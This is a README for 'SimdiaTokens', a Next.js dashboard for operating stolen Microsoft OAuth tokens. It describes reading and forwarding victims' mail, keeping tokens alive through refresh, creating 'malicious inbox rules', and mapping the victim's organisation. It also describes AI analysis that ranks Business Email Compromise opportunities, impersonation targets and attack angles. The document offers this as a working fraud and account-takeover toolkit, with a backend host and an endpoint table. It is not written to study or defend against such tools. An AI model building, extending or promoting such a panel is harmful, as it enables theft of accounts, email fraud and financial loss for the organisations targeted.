# SimdiaTokens — Enterprise Token Management Dashboard

A production-grade Next.js dashboard for managing harvested OAuth2 tokens, featuring a webmail-style inbox console, AI-powered BEC opportunity analysis, organizational reconnaissance, inbox rule creation, and token persistence through refresh.

Built to match the EvilTokens design language — dark UI, glassmorphism, Framer Motion animations, responsive layout.

## Quick Start

```bash
npm install
npm run dev
```

Open [http://localhost:3000](http://localhost:3000).

## Environment Variables

Copy `.env.local` to configure the backend URL:

```
NEXT_PUBLIC_API_URL=https://simdiatokens-server-production.up.railway.app
```

## Features

### Dashboard
- Real-time token statistics (total, active, expired, sources)
- Sortable, filterable, paginated token table
- Search by email, source, or token ID
- Status filter (active/expired) and source filter
- Bulk selection with delete
- CSV and JSON export
- Auto-refresh every 15 seconds (React Query `refetchInterval`)

### Inbox Management Console (`/inbox/[tokenId]`)
- Split-screen layout: email list (left) + detail viewer (right)
- Search emails by subject, sender, body preview
- Filter by read / unread / all
- Sort by date or sender
- Full HTML email rendering with prose styling
- Mark as read/unread (visual indicator)
- **AI Email Summarization** — generates a summary of the selected email
- **Forward Email** — compose and forward to another address
- **Create Inbox Rule** — create malicious inbox rules with conditions and actions
- Mock data fallback when backend is unavailable

### AI-Powered BEC Analysis (`/analyze/[tokenId]`)
- Analyzes all inbox emails for Business Email Compromise opportunities
- Animated risk score gauge (0–100)
- Severity classification (Critical / High / Medium / Low)
- Identified BEC opportunities with confidence scores
- Financial conversation threads with amounts
- Executives identified with influence ratings
- Ongoing deals and invoices detected
- High-value targets for impersonation
- Suggested attack angles with complexity and success probability
- Prerequisites checklist for each attack scenario

### Organization Reconnaissance (`/recon/[tokenId]`)
- **User Profile** — displayName, jobTitle, department, office, email, phone, employee ID, address, account status
- **Manager** — manager's full profile details
- **Direct Reports** — expandable list with search, showing titles, departments, emails
- **Group Memberships** — direct and transitive groups with M365/Security badges, visibility, membership rules, descriptions

### Token Persistence & Refresh
- Refresh expired tokens using stored refresh_token
- Calls `/api/refresh?token_id={id}`
- Per-token loading state with spinner
- Success/error toast notifications (Sonner)

### Enterprise UX
- **Dark/Light theme** — toggle in sidebar, persisted to localStorage
- **Skeleton loaders** — animated placeholders across all views
- **Error boundary** — graceful error handling with retry
- **Keyboard shortcuts** — `Ctrl+R` (refresh), `Ctrl+K` (search)
- **Responsive** — mobile drawer sidebar, horizontal-scroll tables
- **Toast notifications** — Sonner with rich colors, positioned top-right

## Tech Stack

| Category | Library | Version |
|---|---|---|
| Framework | Next.js (App Router) | 16.2 |
| Language | TypeScript (strict) | ^5 |
| Styling | Tailwind CSS | ^4 |
| UI Kit | shadcn/ui (Base UI) | ^4.5 |
| Animations | Framer Motion | ^12.38 |
| Icons | Lucide React | ^1.11 |
| Data Fetching | TanStack React Query | ^5.100 |
| Forms | React Hook Form | ^7.74 |
| Toasts | Sonner | ^2.0 |
| Dates | date-fns | ^4.1 |

## Project Structure

```
src/
├── app/
│   ├── layout.tsx                    # Root layout — QueryProvider, ThemeProvider, ErrorBoundary, AppShell, Toaster
│   ├── page.tsx                      # Dashboard (React Query powered)
│   ├── inbox/[tokenId]/page.tsx      # Inbox management console
│   ├── recon/[tokenId]/page.tsx      # Organization enumeration
│   ├── analyze/[tokenId]/page.tsx    # AI BEC opportunity analysis
│   ├── activity/page.tsx             # Activity log (placeholder)
│   ├── analytics/page.tsx            # Analytics (placeholder)
│   ├── campaigns/page.tsx            # Campaigns (placeholder)
│   ├── settings/page.tsx             # Settings (placeholder)
│   └── tokens/page.tsx               # Token browser (placeholder)
├── components/
│   ├── ui/                           # shadcn/ui primitives + custom
│   │   ├── button, badge, checkbox, dialog, input, select,
│   │   │   switch, table, tooltip, scroll-area, skeleton
│   │   ├── error-boundary.tsx        # React error boundary
│   │   ├── loading-skeleton.tsx      # Skeleton loader variants (7 patterns)
│   │   ├── query-provider.tsx        # TanStack Query provider
│   │   ├── theme-provider.tsx        # Dark/light theme context + toggle
│   │   └── toast.tsx                 # Legacy toast (deprecated — use Sonner)
│   ├── dashboard/
│   │   ├── token-table.tsx           # Token list with search, filter, pagination, actions
│   │   ├── token-filters.tsx         # Extracted filter/search UI
│   │   ├── sidebar.tsx               # Enterprise sidebar with theme toggle
│   │   ├── app-shell.tsx             # Responsive layout (desktop sidebar + mobile drawer)
│   │   ├── top-bar.tsx               # Page header component
│   │   └── stats-cards.tsx           # Token statistics cards
│   ├── inbox/
│   │   ├── email-list.tsx            # Email list with search, filter, sort
│   │   ├── email-detail.tsx          # Email viewer + AI summarize, forward, create rule, mark unread
│   │   ├── rule-creator-modal.tsx    # Create inbox rule (React Hook Form)
│   │   └── email-forward-modal.tsx   # Forward email modal
│   ├── recon/
│   │   ├── profile-card.tsx          # User profile display
│   │   ├── direct-reports-table.tsx  # Expandable direct reports list
│   │   ├── member-of-list.tsx        # Direct + transitive group memberships
│   │   └── manager-card.tsx          # Manager details
│   └── analyze/
│       └── analysis-report.tsx       # Full BEC analysis report with collapsible sections
├── hooks/
│   ├── use-tokens.ts                 # Token fetching hook
│   ├── use-inbox.ts                  # Inbox fetching hook
│   └── use-keyboard-shortcuts.ts     # Global keyboard shortcut registry
├── lib/
│   ├── api.ts                        # API function exports
│   └── utils.ts                      # cn(), fetchWithRetry(), all API calls with retry logic
└── types/
    └── token.ts                      # All TypeScript interfaces + types
```

## Backend API Endpoints

| Endpoint | Method | Description |
|---|---|---|
| `/api/tokens` | GET | Fetch all harvested tokens |
| `/api/inbox?token_id={id}` | GET | Fetch Microsoft Graph inbox messages |
| `/api/graph/me?token_id={id}` | GET | Graph API: user profile |
| `/api/graph/manager?token_id={id}` | GET | Graph API: user's manager |
| `/api/graph/directReports?token_id={id}` | GET | Graph API: direct reports |
| `/api/graph/memberOf?token_id={id}` | GET | Graph API: group memberships |
| `/api/graph/transitiveMemberOf?token_id={id}` | GET | Graph API: transitive groups |
| `/api/refresh?token_id={id}` | POST | Refresh access token via refresh_token |
| `/api/summarize?token_id={id}` | POST | AI email summarization |
| `/api/analyze?token_id={id}` | POST | AI BEC opportunity analysis |
| `/api/create_rule?token_id={id}` | POST | Create malicious inbox rule |
| `/api/forward?token_id={id}` | POST | Forward email |

All endpoints are proxied through the backend at `NEXT_PUBLIC_API_URL`. The frontend includes mock data fallbacks for every endpoint — the UI is fully functional without a running backend.

## Keyboard Shortcuts

| Key | Action |
|---|---|
| `Ctrl+R` | Refresh data (dashboard + inbox) |
| `Ctrl+K` | Focus search input |

## Build

```bash
npm run build   # Production build
npm start       # Production server
npm run lint    # Lint check
```
